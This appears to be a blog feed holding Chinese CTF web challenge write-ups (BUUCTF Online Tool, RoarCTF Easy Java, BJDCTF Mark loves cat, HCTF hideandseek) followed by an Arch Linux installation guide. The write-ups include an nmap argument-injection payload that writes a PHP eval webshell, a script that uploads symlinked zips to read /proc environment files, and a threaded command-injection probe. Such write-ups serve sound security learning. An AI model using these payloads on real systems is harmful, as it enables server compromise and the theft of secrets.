operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">Send</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span>end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>i <span class="token operator">=</span> files<span class="token punctuation">[</span>i<span class="token punctuation">]</span>get <span class="token operator">=</span> GetGet<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Try filename: %s"</span><span class="token operator">%</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> get<span class="token punctuation">:</span>NewUrl <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"%s?%s=%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token string">'echo "Success!!!"'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>NewUrl<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"Success"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Success! Url:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>NewUrl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span>post <span class="token operator">=</span> GetPost<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> post<span class="token punctuation">:</span>NewUrl <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>NewUrl<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span>j<span class="token punctuation">:</span><span class="token string">"echo 'Success!!'"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"Success"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Success! Post:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token keyword">class</span> <span class="token class-name">myThread</span> <span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> threadID<span class="token punctuation">,</span> name<span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>threadID <span class="token operator">=</span> threadID        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>counter <span class="token operator">=</span> counter    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                       Send<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>counter<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>thread <span class="token operator">=</span> myThread<span class="token punctuation">(</span>i<span class="token punctuation">,</span>i<span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">)</span>thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码地址：<a href="https://blog.csdn.net/qq_42967398/article/details/103527666">https://blog.csdn.net/qq_42967398/article/details/103527666</a></p><p>找到了利用文件： xk0SzyKwfzw.php  and 找到了利用的参数：Efa5BVG </p><p>直接查看flag就行了</p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题之前好像在攻防世界做过</p><p>escapeshellarg()和escapeshellcmd() 两个函数一起用会出现问题</p><blockquote><p>传入的参数是：172.17.0.2’ -v -d a=1<br>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用<br>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义<br>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p></blockquote><p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><pre class="line-numbers language-none"><code class="language-none">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令的输入是可控的，通过nmap写个木马进去，根据返回的文件路径连接上去就行了</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306104530832.png" alt="image-20210306104530832"></p><p>在这里试了一些常见的账号密码都不行，点击help发现url变成了<code>http://780e4c0e-2a61-4620-8ac8-f2acd57f0d0d.node3.buuoj.cn/Download?filename=help.docx</code>可能存在文件包含，但这是java的，自己没做过，查找资料发现有个WEB-INF/web.xml泄露</p><blockquote><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p><p>   /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</p><p>   /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</p><p>   /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p><p>   /WEB-INF/src/：源码目录，按照包名结构放置各个java文件</p><p>   /WEB-INF/database.properties：数据库配置文件</p><p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306105407809.png" alt="image-20210306105407809"></p><p>flag可能在那个文件中访问试试</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306105659682.png" alt="image-20210306105659682"></p><p>这段base64解码应该就是了</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>扫描网站目录发现有<code>.git</code>源码泄露</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210308150406235.png" alt="下载下来发现如下文件"></p><p>有用的就是那两个php文件了</p><p>flag.php:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>index.php:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yds'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"the flag is: "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来就要考虑如何绕过了</p><p>这里可以利用变量覆盖漏洞获取flag</p><p>第一个if条件要求GET参数flag的值绝对等于一个值，而这个值的键名不等于flag，这是个永假式</p><p>第二个if要求没设置GET型flag参数，也没有设置POST型flag参数，这里可以利用变量覆盖漏洞让它返回$flag</p><p>第三个if要求POST型参数flag的值为flag，或GET型flag的值为flag</p><p>到这里有一下几个思路</p><ol><li><strong>单独的GET</strong>:<code>yds=flag</code></li><li><strong>GET+POST</strong>:<code>is=flag&amp;flag=flag</code></li><li><strong>GET+POST</strong>:<code>GET:yds=flag  POST:$flag=flag</code></li></ol><p>OK! 干饭去了</p><h2 id="2018HCTF-hideandseek"><a href="#2018HCTF-hideandseek" class="headerlink" title="2018HCTF hideandseek"></a>2018HCTF hideandseek</h2><blockquote><p>linux软连接读取文件</p><p>falsk session加解密</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210319222725626.png"></p><p>开局要登录，准备用admin去试几个密码，结果发现不可行</p><p>随便输个账号密码也能登进去（应该没有数据库，而是靠cookie或者是session来判断的），接下来就是文件上传了，提示只能上传zip</p><p>上传zip后应该会被解压，然后返回里面的内容？</p><p>试了一下果然可以，在WSL创建一个软链接，然后把它压缩成zip传上去</p><p>上脚本直接查看进程运行时的环境变量看看有什么可用的信息</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">createlink</span><span class="token punctuation">(</span>linkway<span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ln -s %s link'</span> <span class="token operator">%</span> linkway<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'zip -y -m test.zip link'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">uploadfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://38994068-7739-4c46-8e5a-4861ae8a3e86.node3.buuoj.cn/upload'</span>    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'the_file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.zip'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">'Submit'</span><span class="token punctuation">&#125;</span>    a <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    linkway <span class="token operator">=</span> <span class="token string">'/proc/%d/environ'</span><span class="token operator">%</span>i    createlink<span class="token punctuation">(</span>linkway<span class="token punctuation">)</span>    uploadfile<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210319225011841.png"></p><p>直接就爆出来了。。。我感觉正常应该要伪造个cookie或者是session登入admin才能拿到flag的</p><p>看了一下网上一些人的做法，还是构造软链接去读取有用的信息</p><p>还是要去<code>/proc/self/environ</code>查看环境变量列表</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Archlinux</title>
      <link href="2021/linux/archlinux/"/>
      <url>2021/linux/archlinux/</url>
      
        <content type="html"><![CDATA[<h3 id="1-刻录启动优盘"><a href="#1-刻录启动优盘" class="headerlink" title="1.刻录启动优盘"></a>1.刻录启动优盘</h3><p>准备一个 2G 以上的优盘，刻录一个安装启动盘。</p><p>Windows 下推荐使用<a href="https://www.poweriso.com/download.php">Power ISO</a>或者<a href="https://rufus.ie/">Rufus</a>进行光盘刻录。二者皆为免费使用的软件。具体操作请自行查阅，都非常简单。</p><p>Linux 下可以直接用 dd 命令进行刻录。注意 of 的参数为 sdx,不是 sdx1 sdx2 等。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">dd</span> <span class="token assign-left variable">bs</span><span class="token operator">=</span>4M <span class="token assign-left variable">if</span><span class="token operator">=</span>/path/to/archlinux.iso <span class="token assign-left variable">of</span><span class="token operator">=</span>/dev/sdx <span class="token assign-left variable">status</span><span class="token operator">=</span>progress <span class="token assign-left variable">oflag</span><span class="token operator">=</span>sync<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bs=4M 指定一个较为合理的文件输入输出块大小。<br>status=progress 用来输出刻录过程总的信息。<br>oflag=sync 用来控制写入数据时的行为特征。确保命令结束时数据及元数据真正写入磁盘，而不是刚写入缓存就返回。</p><h3 id="2-主板-BIOS-相关设置"><a href="#2-主板-BIOS-相关设置" class="headerlink" title="2.主板 BIOS 相关设置"></a>2.主板 BIOS 相关设置</h3><p>在开机的时候，按下 F2/F8/F10 等(取决与你的主板型号，具体请查阅你主板的相关信息)按键，进入主板的 BIOS 设置界面。</p><h4 id="关闭主板设置中的-Secure-Boot"><a href="#关闭主板设置中的-Secure-Boot" class="headerlink" title="关闭主板设置中的 Secure Boot"></a>关闭主板设置中的 Secure Boot</h4><p>找到一项名为 Secure Boot(名称可能略有差异)的选项，将其 Disable 禁用。</p><h4 id="调整硬盘启动顺序"><a href="#调整硬盘启动顺序" class="headerlink" title="调整硬盘启动顺序"></a>调整硬盘启动顺序</h4><p>找到类似名为 Boot Options 的设置选项，将 USB 优盘的启动顺序调至首位。</p><h4 id="调整启动方式为-UEFI"><a href="#调整启动方式为-UEFI" class="headerlink" title="调整启动方式为 UEFI"></a>调整启动方式为 UEFI</h4><p>在某些旧的主板里，需要调整启动模式为 UEFI,而非传统的 BIOS。找到类似名为 Boot Mode 的选项，确保将其调整为 UEFI only，而非 legacy。</p><p>最后插入优盘，保存退出，一般的按键是 F10。此时系统重启，不出意外你应该已经进入 archlinux 的安装界面。</p><h4 id="检测是否为-UEFI"><a href="#检测是否为-UEFI" class="headerlink" title="检测是否为 UEFI"></a>检测是否为 UEFI</h4><p>在一系列的信息刷屏后，可以看到已经以 root 登陆安装系统了，此时第一个执行的命令是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /sys/firmware/efi/efivars<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若输出了一堆东西，说明已在 UEFI 模式。否则请确认你的启动方式是否为 UEFI。</p><h3 id="3-连接网络"><a href="#3-连接网络" class="headerlink" title="3.连接网络"></a>3.连接网络</h3><p>无线连接:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iwctl                           <span class="token comment">#进入交互式命令行</span>device list                     <span class="token comment">#列出设备名，比如无线网卡看到叫 wlan0</span>station wlan0 scan              <span class="token comment">#扫描网络</span>station wlan0 get-networks      <span class="token comment">#列出网络 比如想连接CMCC-5AQ7这个无线</span>station wlan0 connect CMCC-5AQ7 <span class="token comment">#进行连接 输入密码即可</span><span class="token builtin class-name">exit</span>                            <span class="token comment">#成功后exit退出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有线连接:<br>正常来说，只要插上一个已经联网的路由器分出的网线(DHCP)，直接就能联网。</p><p>可以等待几秒等网络建立链接后再进行下步测试网络的操作。</p><h3 id="4-测试网络"><a href="#4-测试网络" class="headerlink" title="4.测试网络"></a>4.测试网络</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若能看到数据返回，即说明已经联网，ctrl+c 终止退出当前命令。如果还是无法连接，使用 <code>ip link set xxx up</code> 命令确认你已经激活了对应的网卡，再重新继续网络链接与测试。若看到类似<code>Operation not possible due to RF-kill</code>的报错，继续尝试<code>rfkill unblock wifi</code>来解锁无线网卡。</p><h3 id="5-禁用自作聪明的-reflector"><a href="#5-禁用自作聪明的-reflector" class="headerlink" title="5.禁用自作聪明的 reflector"></a>5.禁用自作聪明的 reflector</h3><p>2020 年新版 archliveiso 加入了 reflector 服务，它会自己更新 mirrorlist，然而其结果并不准确，并且会删除掉部分源信息，包括中国的源，这里联网后的第一件事就是将其禁用。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl stop reflector.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-更新系统时钟"><a href="#6-更新系统时钟" class="headerlink" title="6.更新系统时钟"></a>6.更新系统时钟</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">timedatectl set-ntp <span class="token boolean">true</span>    <span class="token comment">#将系统时间与网络时间进行同步</span>timedatectl status          <span class="token comment">#检查服务状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-更换国内镜像源加快下载速度"><a href="#7-更换国内镜像源加快下载速度" class="headerlink" title="7.更换国内镜像源加快下载速度"></a>7.更换国内镜像源加快下载速度</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/pacman.d/mirrorlist  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>放在最上面的是会使用的更新源,把中科大 ustc 的或者清华的放在最上面。</p><h3 id="8-分区"><a href="#8-分区" class="headerlink" title="8.分区"></a>8.分区</h3><p>这里总共设置四个分区，可以满足绝大多数人的需求。</p><ul><li>根目录： <code>/</code> 100G</li><li>EFI： <code>/boot</code> 300M</li><li>交换分区: <code>swap</code> 2G</li><li>用户主目录： <code>/home</code> 剩余全部 越大越好</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsblk                       <span class="token comment">#显示分区情况</span><span class="token function">parted</span> /dev/sdx             <span class="token comment">#执行parted，进行磁盘类型变更</span><span class="token punctuation">(</span>parted<span class="token punctuation">)</span>mktableNew disk label type? gpt    <span class="token comment">#输入gpt 将磁盘类型转换为gpt 如磁盘有数据会警告，输入yes即可</span>quit                        <span class="token comment">#最后quit退出parted命令行交互</span><span class="token function">cfdisk</span>  /dev/sdx            <span class="token comment">#来执行分区操作,分配各个分区大小，类型</span><span class="token function">fdisk</span> -l                    <span class="token comment">#复查磁盘情况</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般建议将 EFI 分区设置为磁盘的第一个分区，据说有些主板如果不将 EFI 设置为第一个分区，可能有不兼容的问题。</p><h3 id="9-格式化"><a href="#9-格式化" class="headerlink" title="9.格式化"></a>9.格式化</h3><p>这里的 sdax 只是例子，具体根据你的实际情况来，请注意视频中的操作。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#磁盘若有数据会问 'proceed any way?' y回车 即可</span>mkfs.ext4  /dev/sdax            <span class="token comment">#格式化根目录和home目录的两个分区</span>mkfs.vfat  /dev/sdax            <span class="token comment">#格式化efi分区</span><span class="token function">mkswap</span> -f /dev/sdax             <span class="token comment">#格式化swap</span><span class="token function">swapon</span> /dev/sdax                <span class="token comment">#打开swap分区</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-挂载"><a href="#10-挂载" class="headerlink" title="10.挂载"></a>10.挂载</h3><p>在挂载时，挂载是有顺序的，需要从根目录开始挂载<br>这里的 sdax 只是例子，具体根据你的实际情况来，请注意视频中的操作。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/sdax  /mnt<span class="token function">mkdir</span> 